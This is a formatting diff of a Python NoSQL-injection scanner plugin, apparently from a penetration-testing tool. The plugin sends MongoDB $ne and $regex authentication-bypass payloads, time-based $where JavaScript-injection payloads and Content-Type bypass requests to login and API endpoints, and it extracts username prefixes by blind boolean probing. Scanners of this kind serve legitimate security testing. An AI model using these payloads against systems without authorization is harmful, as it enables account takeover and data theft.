@@ -1,20 +1,43 @@
 # plugins/nosql_scanner.py — Cascavel 2026 Intelligence
-import requests
-import time
 import json as _json
+import time
 
+import requests
 
 ENDPOINTS = [
-    "/api/login", "/login", "/api/auth", "/auth", "/api/users",
-    "/api/v1/login", "/api/v1/auth", "/api/search", "/api/v1/users",
-    "/api/v1/search", "/api/v1/products", "/api/account",
-    "/api/v2/login", "/api/v2/auth", "/graphql", "/api/profile",
-    "/api/admin", "/api/register", "/api/reset-password",
+    "/api/login",
+    "/login",
+    "/api/auth",
+    "/auth",
+    "/api/users",
+    "/api/v1/login",
+    "/api/v1/auth",
+    "/api/search",
+    "/api/v1/users",
+    "/api/v1/search",
+    "/api/v1/products",
+    "/api/account",
+    "/api/v2/login",
+    "/api/v2/auth",
+    "/graphql",
+    "/api/profile",
+    "/api/admin",
+    "/api/register",
+    "/api/reset-password",
 ]
 
 SUCCESS_INDICATORS = [
-    "token", "session", "welcome", "dashboard", "success", "jwt",
-    "logged", "authenticated", "user_id", "access_token", "refresh_token",
+    "token",
+    "session",
+    "welcome",
+    "dashboard",
+    "success",
+    "jwt",
+    "logged",
+    "authenticated",
+    "user_id",
+    "access_token",
+    "refresh_token",
 ]
 
 # ──────────── AUTH BYPASS (MongoDB Operator Injection) ────────────
@@ -57,7 +80,11 @@ WHERE_PAYLOADS = [
 # ──────────── $where TIME-BASED (SSJI) ────────────
 SSJI_TIME_PAYLOADS = [
     ({"$where": "sleep(5000)"}, "SSJI_SLEEP", 4.0),
-    ({"$where": "function() { var x = new Date(); while(new Date() - x < 5000); return true; }"}, "SSJI_BUSY_WAIT", 4.0),
+    (
+        {"$where": "function() { var x = new Date(); while(new Date() - x < 5000); return true; }"},
+        "SSJI_BUSY_WAIT",
+        4.0,
+    ),
     ({"$where": "(function(){var d=new Date();while(new Date()-d<5000){}return true;})()"}, "SSJI_IIFE_WAIT", 4.0),
 ]
 
@@ -72,16 +99,22 @@ def _test_auth_bypass(target, endpoint):
     for payload, method in AUTH_PAYLOADS:
         try:
             resp = requests.post(
-                url, json=payload, timeout=6,
+                url,
+                json=payload,
+                timeout=6,
                 headers={"Content-Type": "application/json"},
             )
             if resp.status_code == 200 and any(k in resp.text.lower() for k in SUCCESS_INDICATORS):
-                vulns.append({
-                    "tipo": "NOSQL_AUTH_BYPASS", "metodo": method,
-                    "endpoint": endpoint, "severidade": "CRITICO",
-                    "descricao": f"Auth bypass via {method}!",
-                    "amostra": resp.text[:200],
-                })
+                vulns.append(
+                    {
+                        "tipo": "NOSQL_AUTH_BYPASS",
+                        "metodo": method,
+                        "endpoint": endpoint,
+                        "severidade": "CRITICO",
+                        "descricao": f"Auth bypass via {method}!",
+                        "amostra": resp.text[:200],
+                    }
+                )
                 break
         except Exception:
             continue
@@ -95,10 +128,14 @@ def _test_get_injection(target, endpoint):
         try:
             resp = requests.get(f"http://{target}{endpoint}?username{suffix}&password{suffix}", timeout=5)
             if resp.status_code == 200 and len(resp.text) > 100:
-                vulns.append({
-                    "tipo": "NOSQL_GET_INJECTION", "metodo": method,
-                    "endpoint": endpoint, "severidade": "ALTO",
-                })
+                vulns.append(
+                    {
+                        "tipo": "NOSQL_GET_INJECTION",
+                        "metodo": method,
+                        "endpoint": endpoint,
+                        "severidade": "ALTO",
+                    }
+                )
                 break
         except Exception:
             continue
@@ -114,14 +151,20 @@ def _test_where_injection(target, endpoint):
     for payload, method in WHERE_PAYLOADS:
         try:
             resp = requests.post(
-                url, json=payload, timeout=8,
+                url,
+                json=payload,
+                timeout=8,
                 headers={"Content-Type": "application/json"},
             )
             if resp.status_code == 200 and len(resp.text) > 50:
-                vulns.append({
-                    "tipo": "NOSQL_WHERE_INJECTION", "metodo": method,
-                    "endpoint": endpoint, "severidade": "ALTO",
-                })
+                vulns.append(
+                    {
+                        "tipo": "NOSQL_WHERE_INJECTION",
+                        "metodo": method,
+                        "endpoint": endpoint,
+                        "severidade": "ALTO",
+                    }
+                )
         except Exception:
             continue
 
@@ -130,23 +173,33 @@ def _test_where_injection(target, endpoint):
         try:
             start = time.time()
             requests.post(
-                url, json=payload, timeout=12,
+                url,
+                json=payload,
+                timeout=12,
                 headers={"Content-Type": "application/json"},
             )
             elapsed = time.time() - start
             if elapsed > threshold:
-                vulns.append({
-                    "tipo": "NOSQL_SSJI", "metodo": method,
-                    "endpoint": endpoint, "severidade": "CRITICO",
-                    "tempo": round(elapsed, 2),
-                    "descricao": "Server-Side JavaScript Injection via $where (time-based)!",
-                })
+                vulns.append(
+                    {
+                        "tipo": "NOSQL_SSJI",
+                        "metodo": method,
+                        "endpoint": endpoint,
+                        "severidade": "CRITICO",
+                        "tempo": round(elapsed, 2),
+                        "descricao": "Server-Side JavaScript Injection via $where (time-based)!",
+                    }
+                )
                 break
         except requests.Timeout:
-            vulns.append({
-                "tipo": "NOSQL_SSJI_TIMEOUT", "metodo": method,
-                "endpoint": endpoint, "severidade": "ALTO",
-            })
+            vulns.append(
+                {
+                    "tipo": "NOSQL_SSJI_TIMEOUT",
+                    "metodo": method,
+                    "endpoint": endpoint,
+                    "severidade": "ALTO",
+                }
+            )
             break
         except Exception:
             continue
@@ -159,26 +212,30 @@ def _test_blind_boolean(target, endpoint):
     url = f"http://{target}{endpoint}"
     try:
         r_true = requests.post(
-            url, json={"username": {"$regex": "^a"}, "password": {"$ne": ""}},
-            timeout=5, headers={"Content-Type": "application/json"},
+            url,
+            json={"username": {"$regex": "^a"}, "password": {"$ne": ""}},
+            timeout=5,
+            headers={"Content-Type": "application/json"},
         )
         r_false = requests.post(
-            url, json={"username": {"$regex": "^ZZZZZZ"}, "password": {"$ne": ""}},
-            timeout=5, headers={"Content-Type": "application/json"},
+            url,
+            json={"username": {"$regex": "^ZZZZZZ"}, "password": {"$ne": ""}},
+            timeout=5,
+            headers={"Content-Type": "application/json"},
         )
         if len(r_true.text) != len(r_false.text) or r_true.status_code != r_false.status_code:
             # Try to extract first 3 chars of username
             extracted = ""
-            for pos in range(3):
+            for _pos in range(3):
                 for char in CHARSET:
                     probe = {"username": {"$regex": f"^{extracted}{char}"}, "password": {"$ne": ""}}
-                    resp = requests.post(url, json=probe, timeout=4,
-                                          headers={"Content-Type": "application/json"})
+                    resp = requests.post(url, json=probe, timeout=4, headers={"Content-Type": "application/json"})
                     if len(resp.text) == len(r_true.text):
                         extracted += char
                         break
             return {
-                "tipo": "NOSQL_BLIND_BOOLEAN", "endpoint": endpoint,
+                "tipo": "NOSQL_BLIND_BOOLEAN",
+                "endpoint": endpoint,
                 "severidade": "ALTO",
                 "descricao": "Blind boolean NoSQL injection detectada!",
                 "username_prefix_extraido": extracted if extracted else "não extraído",
@@ -192,7 +249,7 @@ def _test_content_type_bypass(target, endpoint):
     """Testa NoSQL injection quando Content-Type não é validado."""
     payloads_str = [
         '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
-        'username[$ne]=&password[$ne]=',
+        "username[$ne]=&password[$ne]=",
     ]
     content_types = [
         "text/plain",
@@ -202,13 +259,15 @@ def _test_content_type_bypass(target, endpoint):
         try:
             resp = requests.post(
                 f"http://{target}{endpoint}",
-                data=payload, timeout=5,
+                data=payload,
+                timeout=5,
                 headers={"Content-Type": ct},
             )
             if resp.status_code == 200 and any(k in resp.text.lower() for k in SUCCESS_INDICATORS):
                 return {
                     "tipo": "NOSQL_CONTENT_TYPE_BYPASS",
-                    "endpoint": endpoint, "severidade": "CRITICO",
+                    "endpoint": endpoint,
+                    "severidade": "CRITICO",
                     "content_type": ct,
                     "descricao": f"NoSQL injection via Content-Type bypass ({ct})!",
                 }
@@ -253,7 +312,13 @@ def run(target, ip, open_ports, banners):
     return {
         "plugin": "nosql_scanner",
         "versao": "2026.1",
-        "tecnicas": ["auth_bypass", "operator_injection", "where_ssji",
-                      "blind_boolean", "regex_extraction", "content_type_bypass"],
+        "tecnicas": [
+            "auth_bypass",
+            "operator_injection",
+            "where_ssji",
+            "blind_boolean",
+            "regex_extraction",
+            "content_type_bypass",
+        ],
         "resultados": vulns if vulns else "Nenhuma NoSQL injection detectada",
     }
